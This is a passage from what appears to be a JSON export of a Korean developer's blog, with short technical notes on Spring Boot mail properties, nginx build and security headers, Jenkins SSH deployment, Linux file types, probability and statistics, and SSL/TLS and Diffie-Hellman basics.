Media Types. N. Freed, N. Borenstein. November 1996. (Status: DRAFT STANDARD) RFC-2047 : MIME (Multipurpose Internet Mail Extensions) Part Three: Message Header Extensions for Non-ASCII Text. K. Moore. November 1996. (Status: DRAFT STANDARD) RFC-2048 : Multipurpose Internet Mail Extensions (MIME) Part Four: Registration Procedures. N. Freed, J. Klensin, J. Postel. November 1996. (Status: BEST CURRENT PRACTICE) RFC-2049 : Multipurpose Internet Mail Extensions (MIME) Part Five: Conformance Criteria and Examples. N. Freed, N. Borenstein. November 1996. (Status: DRAFT STANDARD)","categories":[],"tags":[]},{"title":"spring-boot-configuration-properties","slug":"spring-boot-configuration-properties","date":"2020-06-29T02:01:57.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/06/29/spring-boot-configuration-properties/","link":"","permalink":"https://blog.devkwang.app/2020/06/29/spring-boot-configuration-properties/","excerpt":"","text":"@ConfigurationProperties Spring Mail 서비스로 메일 전송하는 기능을 만드려고 하다가 application.yml과 연동되는 Property 값들을 정의하는 방법부터 정리하고자 한다. 1234567@ConfigurationProperties(prefix = \"spring.mail\")public class MailProperties &#123; private String host; private Integer port; private String username; private String password;&#125; 123456spring: mail: host: port: username: password: 1234567891011121314151617181920212223@Configuration(proxyBeanMethods = false)@ConditionalOnClass(&#123; MimeMessage.class, MimeType.class, MailSender.class &#125;)@ConditionalOnMissingBean(MailSender.class)@Conditional(MailSenderCondition.class)@EnableConfigurationProperties(MailProperties.class)@Import(&#123; MailSenderJndiConfiguration.class, MailSenderPropertiesConfiguration.class &#125;)public class MailSenderAutoConfiguration &#123; static class MailSenderCondition extends AnyNestedCondition &#123; MailSenderCondition() &#123; super(ConfigurationPhase.PARSE_CONFIGURATION); &#125; @ConditionalOnProperty(prefix = \"spring.mail\", name = \"host\") static class HostProperty &#123; &#125; @ConditionalOnProperty(prefix = \"spring.mail\", name = \"jndi-name\") static class JndiNameProperty &#123; &#125; &#125;&#125; @EnableConfigurationProperties 로 사용할 MailProperties.class를 선언한 뒤 MailSenderJndiConfiguration과 MailSenderPropertiesConfiguration.class의 설정을 가져와 처리한다. 이 값을 사용하기 위해서는 Bean으로 선언되어 있기 때문에 주입 받아서 사용하면 된다. 123456789101112@Servicepublic class EMailService &#123; @Autowired public JavaMailSender javaMailSender; @Autowired public MailProperties mailProperties; public void sendSimpleMessageMail(String to, String subject, String content) &#123; // javaMailSender.send() &#125;&#125;","categories":[],"tags":[]},{"title":"linux-run-level","slug":"linux-run-level","date":"2020-06-25T01:23:39.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/06/25/linux-run-level/","link":"","permalink":"https://blog.devkwang.app/2020/06/25/linux-run-level/","excerpt":"","text":"Linux Run Level 런레벨 상태 0 시스템 중지 1 단일 사용자 모드(복구 모드) 2 NFS 없는 다중 사용자 모드 3 완전한 다중 사용자 모드 4 미사용 5 그래픽 인터페이스 모드 6 시스템 재시작 Debian, Ubuntu : Run Level 2 RedHat, fedora, CentOS, gentoo : Run Level 3","categories":[],"tags":[]},{"title":"project-nginx","slug":"project-Security","date":"2020-06-24T23:53:07.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/06/25/project-Security/","link":"","permalink":"https://blog.devkwang.app/2020/06/25/project-Security/","excerpt":"","text":"Nginx 설치 사전 설치 필요 Library GCC (GNU) : GNU Compiler Collection PCRE (Perl Compatible Regular Expression) : URL 재작성 모듈 및 HTTP 핵심 모듈이 정규식을 사용한다. zlib : nginx gzip 압축 하는데 필요 OPENSSL : SSL v2/v3, TLS v1 protocol 지원 sudo apt-get install build-essential sudo apt-get install libpcre3 libpcre3-dev sudo apt install zlib zlib-devel sudo apt install zlib1g zlib1g-dev sudo apt install openssl libssl-dev sudo yum install gcc gcc-c++ make sudo yum install pcre pcre-devel sudo yum install zlib zlib-devel sudo yum install openssl openssl-devel Make Compile ./configure --prefix=/home/lscns/project/nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_gzip_static_module prefix = base nginx folder make make install Make Compile ./configure --prefix=/DATA/nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_gzip_static_module prefix = base nginx folder make make install Response Header X-Content-Type-Option : 리소스를 다운로드할때 해당 리소스의 MIMETYPE이 일치하지 않는 경우 차단 해당 헤더 추가 X-Content-Type-Options: nosniff Strict-Transport-Security : 한번 https로 접속하는 경우 이후의 모든 요청을 http로 요청하더라도 브라우저가 자동으로 https로 요청 해당 헤더 추가 Strict-Transport-Security: max-age=63072000; includeSubdomains; preload X-XSS-Protection : (XSS) 공격을 감지 할 때 페이지 로드를 중지시킬 수 있습니다. 해당 헤더 추가 X-XSS-Protection: 1;mode=block X-Frame-Options : 해당 페이지를 또는 , 에서 렌더링할 수 있는지 여부를 나타내는데 사용됩니다. 해당 헤더 추가 X-Frame-Options: sameorigin Referrer-Policy 해당 헤더 추가 ‘Referrer-Policy’ ‘origin’; 12345678910111213141516add_header X-Content-Type-Options &quot;nosniff&quot;;add_header X-XSS-Protection &quot;1;mode=block&quot;;add_header X-Frame-Options &quot;sameorigin&quot;;add_header Strict-Transport-Security &quot;max-age=63072000; includeSubdomains; preload&quot;;add_header &apos;Referrer-Policy&apos; &apos;origin&apos;;``` ### Java- 모든 중요한 쿠키에 &apos;Secure&apos; 속성을 더할 것- The set-cookie was blocked because it has the secure ```yamlserver: servlet: session: cookie: secure: true nginx CORS 123456789101112131415161718192021222324252627282930location / &#123; if ($request_method = &apos;OPTIONS&apos;) &#123; add_header &apos;Access-Control-Allow-Origin&apos; &apos;*&apos;; add_header &apos;Vary: Origin&apos;; add_header &apos;Access-Control-Allow-Methods&apos; &apos;GET, POST, OPTIONS&apos;; # # Custom headers and headers various browsers *should* be OK with but aren&apos;t # add_header &apos;Access-Control-Allow-Headers&apos; &apos;DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range&apos;; # # Tell client that this pre-flight info is valid for 20 days # add_header &apos;Access-Control-Max-Age&apos; 1728000; add_header &apos;Content-Type&apos; &apos;text/plain; charset=utf-8&apos;; add_header &apos;Content-Length&apos; 0; return 204; &#125; if ($request_method = &apos;POST&apos;) &#123; add_header &apos;Access-Control-Allow-Origin&apos; &apos;*&apos;; add_header &apos;Access-Control-Allow-Methods&apos; &apos;GET, POST, OPTIONS&apos;; add_header &apos;Access-Control-Allow-Headers&apos; &apos;DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range&apos;; add_header &apos;Access-Control-Expose-Headers&apos; &apos;Content-Length,Content-Range&apos;; &#125; if ($request_method = &apos;GET&apos;) &#123; add_header &apos;Access-Control-Allow-Origin&apos; &apos;*&apos;; add_header &apos;Access-Control-Allow-Methods&apos; &apos;GET, POST, OPTIONS&apos;; add_header &apos;Access-Control-Allow-Headers&apos; &apos;DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range&apos;; add_header &apos;Access-Control-Expose-Headers&apos; &apos;Content-Length,Content-Range&apos;; &#125;&#125; On-Site Request Forgery Attack Cross-Site Request Forgery Attack","categories":[],"tags":[]},{"title":"project-jasypt","slug":"project-jasypt","date":"2020-06-24T07:14:15.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/06/24/project-jasypt/","link":"","permalink":"https://blog.devkwang.app/2020/06/24/project-jasypt/","excerpt":"","text":"jasypt Java Simplified Encryption Gradle 추가 compile “com.github.ulisesbocchio:jasypt-spring-boot-starter:1.17” StringEncryptor Bean 생성 후 application.yml에 jasypt: encryptor: bean에 해당 bean 이름 선언","categories":[],"tags":[]},{"title":"jenkins-ssh-deploy","slug":"project-jenkins-ssh-deploy","date":"2020-06-23T01:18:22.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/06/23/project-jenkins-ssh-deploy/","link":"","permalink":"https://blog.devkwang.app/2020/06/23/project-jenkins-ssh-deploy/","excerpt":"","text":"Jenkins SSH Deploy Jenkins Plug-in 설치 SSH Agent Plug-in : This plugin allows you to provide SSH credentials to builds via a ssh-agent in Jenkins. jenkins Server에 jenkins 계정으로 public/private keypair 만들기 sudo -u jenkins /bash/sh create a key pair 1ssh-keygen After entering the command, you should see the following prompt 123OutputGenerating public/private rsa key pair.Enter file in which to save the key (/your_home/.ssh/id_rsa): 생성하면 id_rsa, id_rsa.pub file이 만들어진다. remote Server의 .ssh폴더에 authorized_keys 파일에 jenkins Server의 Jenkins 계정 public key 등록하기 Jenkins Credentials의 Global Credential에 jenkins 계정 private key 등록하기 pipeline 구성 pipeline 1234sshagent([&apos;user_key_id&apos;]) &#123; sh &apos;scp blur blur~&apos; sh &apos;ssh -t -t userId@targetIp -o StrictHostKeyChecking=no &quot;cd /usr/local &amp;&amp; ./start.sh&quot;&apos;&#125; start.sh 생성","categories":[],"tags":[]},{"title":"linux-command-ls","slug":"linux-command-ls","date":"2020-06-21T23:53:45.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/06/22/linux-command-ls/","link":"","permalink":"https://blog.devkwang.app/2020/06/22/linux-command-ls/","excerpt":"","text":"ls 명령어 For each directory that is listed, preface the files with a line 'total BLOCKS', where BLOCKS is the total disk allocation for all files in that directory. The block size currently defaults to 1024 bytes, but this can be overridden (*note Block size::). The BLOCKS computed counts each hard link separately; this is arguably a deficiency. The file type is one of the following characters: '-' regular file 'b' block special file 'c' character special file 'C' high performance (&quot;contiguous data&quot;) file 'd' directory 'D' door (Solaris 2.5 and up) 'l' symbolic link 'M' off-line (&quot;migrated&quot;) file (Cray DMF) 'n' network special file (HP-UX) 'p' FIFO (named pipe) 'P' port (Solaris 10 and up) 's' socket '?' some other file type The file mode bits listed are similar to symbolic mode specifications (*note Symbolic Modes::). But 'ls' combines multiple bits into the third character of each set of permissions as follows: 's' If the set-user-ID or set-group-ID bit and the corresponding executable bit are both set. 'S' If the set-user-ID or set-group-ID bit is set but the corresponding executable bit is not set. 't' If the restricted deletion flag or sticky bit, and the other-executable bit, are both set. The restricted deletion flag is another name for the sticky bit. *Note Mode Structure::. 'T' If the restricted deletion flag or sticky bit is set but the other-executable bit is not set. 'x' If the executable bit is set and none of the above apply. '-' Otherwise. File Type Regular File The most common file, which contains data of some form. Directory File A file contains the names of other files and pointers to information on these files. Any process that has read permission for a directory file can read contents of the directory, but only the kernel can write directly to a directory file. Block Special file 요청이 장치 드라이버에 의해 처리되며 이러한 유형을 디바이스 파일이라고 한다. 디바이스 파일은 어떤 드라이버에 의해서 사용되는지 구분하기 위한 연관번호를 가지고 있다. 블록 특수 파일은 일반 파일과 유사하고 문자 특수 파일은 파이프처럼 행동합니다. Character special file A type of file providing unbuffered I/O access in variable-sized units to devices. 이 장치파일은 데이터를 쓰거나 읽는게 즉시 일어나는 파이프나 시리얼 포트처럼 행동한다. FIFO Process Inter communication Socket 네트워크의 입출력을 담당하는 API Symbolic link A Type of file that points to another file 다른 파일을 가리키는 타입의 파일","categories":[],"tags":[]},{"title":"probability-statistics-basic","slug":"probability-statistics-basic","date":"2020-05-18T06:33:03.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/05/18/probability-statistics-basic/","link":"","permalink":"https://blog.devkwang.app/2020/05/18/probability-statistics-basic/","excerpt":"","text":"확률 확률 확률 = 어떤 사건이 발생할 수 있는 경우의 가짓수 / 모든 경우의 가짓 수 여사건 사건 A가 발생하지 않을 사건 P(A‾)=1−PP(\\overline{A}) = 1 - PP(A)=1−P 합사건 사건 A와 사건 B중에서 어느 한쪽이 발생할 사건 P(A∪B)=P(A)+P(B)−P(A∩B)P(A \\cup B) = P(A) + P(B) - P(A \\cap B)P(A∪B)=P(A)+P(B)−P(A∩B) 곱사건 사건 A와 B가 동시에 일어나는 사건 P(A∩B)=P(A)P(B)P(A \\cap B) = P(A)P(B)P(A∩B)=P(A)P(B) 확률 변수와 확률 분포 확률 변수 어떤 변수 X를 P(X)의 확률로 나오게 할 수 있다면, 이 X는 확률 변수라고 말할 수 있다. 이산 확률 변수 어떤 사건의 이산확률 변수가 X일 때, 그에 대한 확률 P는 이산확률분포 f(x)를 따른다 P(X) = f(x) histogram 연속 확률 변수 어떤 사건의 연속확률 변수가 X일 때, 그에 대한 확률 P는 연속확률분포 f(x)를 지정한 X의 구간 안에서 적분한 값과 같다. P(a≤X≤b)=∫abf(x) dxP\\big(a \\leq X \\leq b \\big) = \\int_a^b f(x)\\,dxP(a≤X≤b)=∫ab​f(x)dx 결합 확률과 조건부 확률 결합 확률 사건 A와 사건 B가 서로 독립된 사건일 때, 두 사건의 결합확률은 다음과 같다. P(A∪B)=P(A)+P(B)P(A \\cup B) = P(A) + P(B)P(A∪B)=P(A)+P(B) 조건부 확률 사건 B가 일어났을 때, 사건 A가 일어날 조건부 확률은 다음과 같다. P(A∣B)=P(A∩B)P(B)P(A | B) = \\dfrac {P(A\\cap B)} {P(B)}P(A∣B)=P(B)P(A∩B)​ 기댓값 기댓값 : X가 확률 변수이고 확률 P(X)인 사건이 존재할 때, 예상할수 있는 결과값이 기댓값이다. E(X)=∑P(X)⋅XE(X) = \\sum P(X) \\cdotp XE(X)=∑P(X)⋅X X와 Y가 서로 독립된 확률변수이고 k는 상수라고 할 때 다음 식이 성립한다. E(k)=kE(k) = kE(k)=k (상수의 기대값은 상수가 된다) E(kX)=kE(X)E(kX) = kE(X)E(kX)=kE(X) (확률변수를 상수 배 하면 기댓값도 상수 배가 된다) E(X+Y)=E(X)+E(Y)E(X+Y) = E(X) + E(Y)E(X+Y)=E(X)+E(Y) (확률 변수들 합의 기대값은 각 기대값의 합과 같다) X와 Y가 서로 독립일 때 E(XY)=E(X)⋅E(Y)E(XY) = E(X) \\cdotp E(Y)E(XY)=E(X)⋅E(Y) (독립적인 확률변수의 곱에 대한 기댓값은 각 기댓값의 곱과 같다) 평균과 분산 그리고 공분산 평균 n개의 확률변수가 각각 x1,x2,⋅⋅⋅,xnx_1, x_2, \\cdotp\\cdotp\\cdotp, x_nx1​,x2​,⋅⋅⋅,xn​ 이라는 값을 가질 때 평균값 x‾\\overline xx는 다음과 같다. x‾=∑k=1n1n⋅xk=1n∑k=1nxk\\overline x =\\sum_{k=1}^{n}{\\frac 1 n}\\cdotp x_k = {\\frac 1 n}\\sum_{k=1}^{n}x_k x=k=1∑n​n1​⋅xk​=n1​k=1∑n​xk​ 분산 n개의 확률변수가 각각 x1,x2,⋅⋅⋅,xnx_1, x_2, \\cdotp\\cdotp\\cdotp, x_nx1​,x2​,⋅⋅⋅,xn​ 이라는 값을 가지고 평균값이 x‾\\overline xx일때 분산 σ2\\sigma^2σ2는 다음과 같다. σ2=1n∑k=1n(xk−x‾)2\\sigma^2 = {\\frac 1 n}\\sum_{k=1}^{n}{(x_k - \\overline x)}^2 σ2=n1​k=1∑n​(xk​−x)2 σ=σ2=1n∑k=1n(xk−x‾)2\\sigma = \\sqrt{\\sigma^2} = \\sqrt{ {\\frac 1 n}\\sum_{k=1}^{n}{(x_k - \\overline x)}^2 } σ=σ2​=n1​k=1∑n​(xk​−x)2​ 공분산 두 가지 데이터에 대한 n조의 확률변수 (X,Y) = {(x1,y1),(x2,y2),...,(xn,yn}\\{(x_1,y_1),(x_2,y_2),...,(x_n, y_n\\}{(x1​,y1​),(x2​,y2​),...,(xn​,yn​} 이 있다고 가정한다. x의 평균이 μx\\mu_xμx​이고 Y의 평균이 μy\\mu_yμy​라고 할 때 공분산 Cov(X,Y)는 다음과 같다. COV(X,Y)=1n∑k=1n(xk−μx)(yk−μy)COV(X,Y) = {\\frac 1 n} \\sum_{k=1}^{n}{(x_k - \\mu_x)(y_k - \\mu_y)} COV(X,Y)=n1​k=1∑n​(xk​−μx​)(yk​−μy​) 다른 두 데이터 간의 관계를 표현하는 지표이기 때문에 공분산을 계산할 때는 단위에 대해 신경쓸 필요가 없다. 공분산이 양의 값을 가질 때, 두가지 데이터는 양의 관계가 있다고 하고, 공분산이 음의 값을 가질 때 두가지 데이터는 음의 관계가 있다고 한다. 상관계수 상관계수 확률 변수 X와 Y가 분산이 양수이고 각각의 표준편차가 σx\\sigma_xσx​, σy\\sigma_yσy​, 공분산이 σxy\\sigma_xyσx​y라고 할 때의 상관게수 (−1≤ρ≤1)(-1 \\le \\rho \\le 1)(−1≤ρ≤1) 는 다음과 같다. ρ=σxyσxσy\\rho = \\frac {\\sigma_xy} {\\sigma_x \\sigma_y} ρ=σx​σy​σx​y​ 상관계수 ρ\\rhoρ는 +1에 가까울 수록 양의 관계가 강하고, -1에 가까울수록 음의 관계가 강합니다. 상관관계가 0에 가까울수록 상관관계가 약하다고 보는데, 일반적으로 상관계수의 절대값이 0.7보다 클 때 상관계수가 강하다고 말한다. 최대 가능도 추정 최대 가능도 추정이란 ‘가장 그럴듯 하게 추정’ 한다는 의미로, 영어로는 가능도를 'likelihood’라고 표현합니다. 최대 가능도를 추정한 다는 말은 곧, 파라미터 θ\\thetaθ에 대한 가능도함수 L(θ)L(\\theta)L(θ)를 최대화 할 수 있는 θ\\thetaθ값을 구하는 것을 의미한다. 1차 미분을 했을 때 dL(θ)dθ=0{\\frac {dL(\\theta)} {d\\theta}} =0dθdL(θ)​=0 이 되는 지점을 의미한다. 극값은 그래프에서 값이 변곡되는 곳에서 발생하기 때문에 0이 되는 지점은 최소값 혹은 최대값이 될 수 있다. 로그 가능도 함수 가능도 함수에 자연로그를 붙여 로그 가능도 함수 ddθlog⁡eL(θ)=0{\\frac {d} {d\\theta}}\\log_eL(\\theta) = 0dθd​loge​L(θ)=0를 만들면 된다. 일반적인 이산확률분포의 식은 확률의 곱으로 표현되는 일이 많다 보니 미분 자체가 어려운 경우가 많다. 로그를 사용하면 곱셈을 덧셈으로 만들고 수식의 차원을 낮춰 계산을 용이하게 하는 장점이 있다. 가능도 함수 L(θ1,θ2,...,θm)L(\\theta_1,\\theta_2,...,\\theta_m)L(θ1​,θ2​,...,θm​)을 최대로 하는 θ1,θ2,...,θm\\theta_1,\\theta_2,...,\\theta_mθ1​,θ2​,...,θm​는 다음 방정식을 만족한다.∂∂θ1L(θ1,θ2,...,θm)=0{\\frac {\\partial}{\\partial\\theta_1}}L(\\theta_1,\\theta_2,...,\\theta_m) = 0 ∂θ1​∂​L(θ1​,θ2​,...,θm​)=0 ∂∂θ2L(θ1,θ2,...,θm)=0{\\frac {\\partial}{\\partial\\theta_2}}L(\\theta_1,\\theta_2,...,\\theta_m) = 0 ∂θ2​∂​L(θ1​,θ2​,...,θm​)=0 ∂∂θmL(θ1,θ2,...,θm)=0{\\frac {\\partial}{\\partial\\theta_m}}L(\\theta_1,\\theta_2,...,\\theta_m) = 0 ∂θm​∂​L(θ1​,θ2​,...,θm​)=0 선형 회귀 모델 회귀 모델이란 하나의 목적변수(종속변수)를 하나 이상의 설명변수(독립변수)로 기술한 관계식이다. ω0,ω1,...ωl\\omega_0, \\omega_1,... \\omega_lω0​,ω1​,...ωl​을 계수(가중치)라고 하고, x1,x2,...,xlx_1,x_2,...,x_lx1​,x2​,...,xl​을 설명 변수라고 할 때 목적변수 y의 선형회귀 모델은 다음과 같이 기술 할 수 있다.y=ω0+∑k=1lωkxky = \\omega_0 + \\sum_{k=1}^{l}{\\omega_kx_k} y=ω0​+k=1∑l​ωk​xk​ y=ω0+ω1x1+ω2x2+ω3x3+⋯+ωlxly = \\omega_0 + \\omega_1x_1 + \\omega_2x_2 + \\omega_3x_3 + \\cdots + \\omega_lx_l y=ω0​+ω1​x1​+ω2​x2​+ω3​x3​+⋯+ωl​xl​ [y1y2⋮yn]=[1x11x12⋯x1l1x21x22⋯x1l⋮⋮⋮⋮⋮1xn1xn2⋅⋅⋅xnl][ω0ω1⋮ωl]\\begin {bmatrix} y1 \\\\ y2 \\\\ {\\vdots} \\\\ y_n \\end{bmatrix} = \\begin {bmatrix} 1 &amp; x_11 &amp; x_12 &amp; {\\cdots} &amp; x_1l \\\\ 1 &amp; x_21 &amp; x_22 &amp; {\\cdots} &amp; x_1l \\\\ {\\vdots} &amp; {\\vdots} &amp; {\\vdots} &amp; {\\vdots} &amp; {\\vdots} \\\\ 1 &amp; x_n1 &amp; x_n2 &amp; {\\cdotp\\cdotp\\cdotp} &amp; x_nl \\\\ \\end{bmatrix} \\begin {bmatrix} \\omega_0 \\\\ \\omega_1 \\\\ {\\vdots} \\\\ \\omega_l \\\\ \\end{bmatrix} ⎣⎢⎢⎢⎡​y1y2⋮yn​​⎦⎥⎥⎥⎤​=⎣⎢⎢⎢⎡​11⋮1​x1​1x2​1⋮xn​1​x1​2x2​2⋮xn​2​⋯⋯⋮⋅⋅⋅​x1​lx1​l⋮xn​l​⎦⎥⎥⎥⎤​⎣⎢⎢⎢⎡​ω0​ω1​⋮ωl​​⎦⎥⎥⎥⎤​ 최소 제곱법 모델식에 가장 잘 들어맞는 가중치를 찾는 것이 중요한데, 이때 사용할 수 있는 근사법으로 최소제곱법이라는 것이 있다. 최소제곱법에서는 데이터 세트와 같은 수치 데이터들을 1차 함수와 같은 특정 함수를 사용하여 근사적으로 표현할 수 있다고 가정한다. 목적변수를 Y, 설명변수를 X1,X2,X3,...,XlX_1, X_2, X_3,... ,X_lX1​,X2​,X3​,...,Xl​ 그리고 모델식을 f(X1,X2,...,Xl)f(X_1, X_2,... ,X_l)f(X1​,X2​,...,Xl​)이라고 할때, 최소 제곱법을 적용 하는 과정은 오차의 제곱합 D를 최소화 하는 f(X1,X2,...,Xl)f(X_1, X_2,... ,X_l)f(X1​,X2​,...,Xl​)를 구하는 것이다. D=∑k=1n(yk−f(xk1,xk2,⋯ ,xkl))2D = \\sum_{k=1}^{n}({y_k - f(x_k1, x_k2, \\cdots, x_kl}))^2D=∑k=1n​(yk​−f(xk​1,xk​2,⋯,xk​l))2 f(xk1,xk2,⋯ ,xkl)=∑m=1lwmxkm+ω0f(x_k1, x_k2, \\cdots, x_kl) = \\sum_{m=1}^{l}w_mx_km + \\omega_0f(xk​1,xk​2,⋯,xk​l)=∑m=1l​wm​xk​m+ω0​ 각 변수의 편미분을 진행하면 ∂D∂ω0=0{\\frac {\\partial D}{\\partial\\omega_0}} = 0∂ω0​∂D​=0, ∂D∂ω1=0{\\frac {\\partial D}{\\partial\\omega_1}} = 0∂ω1​∂D​=0 , ⋯\\cdots⋯, $ ∂D∂ωl=0{\\frac {\\partial D}{\\partial\\omega_l}} = 0∂ωl​∂D​=0 구하고자 하는 변수와 연립방정식이 l+1개가 있으므로 ω0,ω1,⋯ ,ωl\\omega_0, \\omega_1, \\cdots, \\omega_lω0​,ω1​,⋯,ωl​의 값을 구하는 것은 어렵지 않다. 선형 회귀 모델에서는 최소제곱법을 사용해서 가중치의 값을 결정한다.","categories":[],"tags":[]},{"title":"cryptography-ssl-tls","slug":"cryptography-ssl-tls","date":"2020-04-29T01:39:00.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/04/29/cryptography-ssl-tls/","link":"","permalink":"https://blog.devkwang.app/2020/04/29/cryptography-ssl-tls/","excerpt":"","text":"SSL(Secure socket layer)/TLS(Transport Layer Security) 통신 내용을 암호화 해주는 프로토콜 SSL/TLS 상에 HTTP을 올리는 것이다. HTTP의 통신(요청과 응답)은 암호화되어 도청을 방지할 수 있다. SSL/TLS의 역할 도청 당하는 일 없이 통신하고 싶다. ( 기밀성 ) 조작 당하는 일 없이 통신하고 싶다. ( 무결성 ) 통신 상대의 웹 서버가 해당 상대인 것을 확인하고 싶다 ( 상호 인증 ) Cypher Suite 암호 기술의 추천 세트가 SSL/TLS로 규정 되어 있다. HTTPS 인증서 유형 신원 검증 DV (Domain Validated) : DV 인증서는 해당 도메인에 대한 알맞은 공개 키인지를 간단히 확인하며, 브라우저에서는 법적 신원을 보여주지 않는다. EV (Extended Validation) : EV 인증서는 웹 사이트의 법적 신분을 검증한다. 도메인 관리 공인된 사업기록 D&amp;B(Dunn and Bradstreet), salesforce, connect.data.com 등에 기재된 정보 인증서의 모든 도메인 이름 검사 ( 와일드카드 안됨) 도메인 수 단일 도메인 다중 도메인(Unified Communications Certificate/SAN) 와일드 카드 HTTPS 구성 초기 키 교환 (공개키 알고리즘) 신원 인증서 (인증기관에서 발행한 HTTPS 인증서) 실제 메세지 암호화 (대칭키 알고리즘) MAC (Hash 알고리즘) 참고 자료 https://dokydoky.tistory.com/462 https://dokydoky.tistory.com/463 https://dokydoky.tistory.com/464","categories":[{"name":"cryptography","slug":"cryptography","permalink":"https://blog.devkwang.app/categories/cryptography/"}],"tags":[{"name":"key exchange","slug":"key-exchange","permalink":"https://blog.devkwang.app/tags/key-exchange/"},{"name":"ssl","slug":"ssl","permalink":"https://blog.devkwang.app/tags/ssl/"},{"name":"tls","slug":"tls","permalink":"https://blog.devkwang.app/tags/tls/"},{"name":"https","slug":"https","permalink":"https://blog.devkwang.app/tags/https/"}]},{"title":"cryptography-diffie-hellman-algorithm","slug":"cryptography-diffie-hellman-algorithm","date":"2020-04-20T05:23:56.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/04/20/cryptography-diffie-hellman-algorithm/","link":"","permalink":"https://blog.devkwang.app/2020/04/20/cryptography-diffie-hellman-algorithm/","excerpt":"","text":"Diffe-Hellman Algorithm 타인에게 알려져도 상관없는 정보를 두 사람이 교환하는 것만으로 공통의 비밀 값을 만들어내는 방법 실제 키 교환이 아닌 공유할 키를 계산하여 만들어 내는 것 이산 대수 문제(Discrete Logarithm Problem) 이용 y=gxmodPy = g^x mod Py=gxmodP 일때 g와 x와 p를 안다면 y는 구하기 쉽지만 g와 y와 P를 알땐 x를 구하기는 어렵다는 방식에 착안하여 만들어진 알고리즘 잠깐의 수학시간 항등원 : 집합 S의 임의의 원소 a와 원소 e를 연산한 결과가 a가 될 때 e를 연산에 대한 항등원이라고 한다. ex) 10 + 0 = 10 , 10 * 1 = 10 0은 덧셈의 항등원, 1은 곱셈의 항등원 역원 : 집합 S의 임의의 원소 a와 x를 연산한 결과가 항등원 e가 될 때 x를 연산에 대한 a의 역원이라고 한다. ex ) 10 - 10 = 0, 10 * 110\\frac{1}{10}101​ = 1 덧셈 10 의 역원은 -10, 곱셈 10의 역원은 110\\frac{1}{10}101​ 합동 : 두 정수 a와 b에 대하여 그들의 차 a-b가 m의 배수일 때, a는 b는 m을 법으로 합동(congruent modulo m) 이라함. a≡ba \\equiv ba≡b (mod m) ex) 29≡429 \\equiv 429≡4 (mod 5), 1 ≡\\equiv≡ -1 (mod 2) 잉여계 : 정수를 원소로 가지는 집합 A에 대하여, 어떤 임의의 서로 다른 원소도 m에 대한 합동이 아니면 집합 A는 법 m에 대한 잉여계이다. n(A)≤mn(A) \\le mn(A)≤m 이다 완전 잉여계 : C = {x|x는 법 m에 대하여 0,1,2,…(m-1)과 합동인 자연수} 특히, C = {x|x는 법 m에 대하여 0,1,2,…(m-1)} 일때 C는 법 M에 대한 최소 완전 잉여계이다. 집합 {0,1,3,7,9}는 법 5에 대한 완전 잉여계이다. 집합 {0,1,2,3,4,5,6}은 법 7에 대한 최소 완전 잉여계이다. 기약 잉여계 : {a1,a2,...,am}\\text{\\textbraceleft}{a1,a2,..., a_m}\\text{\\textbraceright}{a1,a2,...,am​}을 법 m에 대한 완전 잉여계라고 할 때, 이들 중 m과 서로소일때 원소만 모은 집합 {a1′,a2′,...,am′}\\text{\\textbraceleft}{a_1&#x27;,a_2&#x27;,...,a_m&#x27;}\\text{\\textbraceright}{a1′​,a2′​,...,am′​} 원시근 : 어떤 기약잉여계의 모든 원소를 원시근의 거듭제곱으로 표현할 수 있을때 이를 원시근이라 한다. Discrete logarithm problem https://www.youtube.com/watch?v=SL7J8hPKEWY&amp;feature=youtu.be https://www.youtube.com/watch?v=M-0qt6tdHzk https://docs.oracle.com/javase/7/docs/technotes/guides/security/crypto/CryptoSpec.html#DH2Ex","categories":[{"name":"cryptography","slug":"cryptography","permalink":"https://blog.devkwang.app/categories/cryptography/"}],"tags":[{"name":"key exchange","slug":"key-exchange","permalink":"https://blog.devkwang.app/tags/key-exchange/"}]},{"title":"javascript-module-history","slug":"javascript-module-history","date":"2020-04-19T13:53:36.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/04/19/javascript-module-history/","link":"","permalink":"https://blog.devkwang.app/2020/04/19/javascript-module-history/","excerpt":"","text":"https://weblogs.asp.net/dixin/understanding-all-javascript-module-formats-and-tools","categories":[],"tags":[]},{"title":"blog-migration-gatsby","slug":"blog-migration-gatsby","date":"2020-04-19T13:44:14.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/04/19/blog-migration-gatsby/","link":"","permalink":"https://blog.devkwang.app/2020/04/19/blog-migration-gatsby/","excerpt":"","text":"https://github.com/JaeYeopHan/gatsby-starter-bee https://rinae.dev/posts/creating-new-blog-with-gatsby https://dev.kyoungah.com/2019-07-04-blog-migration/","categories":[],"tags":[]},{"title":"msa-keyword","slug":"msa-keyword","date":"2020-04-16T09:53:50.000Z","updated":"2022-01-28T01:25:12.423Z","comments":true,"path":"2020/04/16/msa-keyword/","link":"","permalink":"https://blog.devkwang.app/2020/04/16/msa-keyword/","excerpt":"","text":"Bus Factor 팀원들 사이에 공유디ㅗ지 않은 지식의 위험에 대한 척도. '만약 버스에 치이면’이라면 표현에서 비롯된 것으로 Truck Factor로도 알려져 있다. 버스 팩터가 낮을수록 더 나쁘다. 운영 준비 상태 신뢰성 서비스가 가용하고 에러에 대응 할 수 있는가? 배포 프로세스가 새로운 기능을 배포할 때 불안정성과 결함을 유발하지 않을 것을 신뢰할 수 있는가? 확장성 서비스가 필요로 하는 리소스와 용량을 이해하는가? 부하 상황에서 어떻게 서비스의 응답성을 유지할 것인가? 투명성 로그와 메트릭을 통해 서비스의 운영을 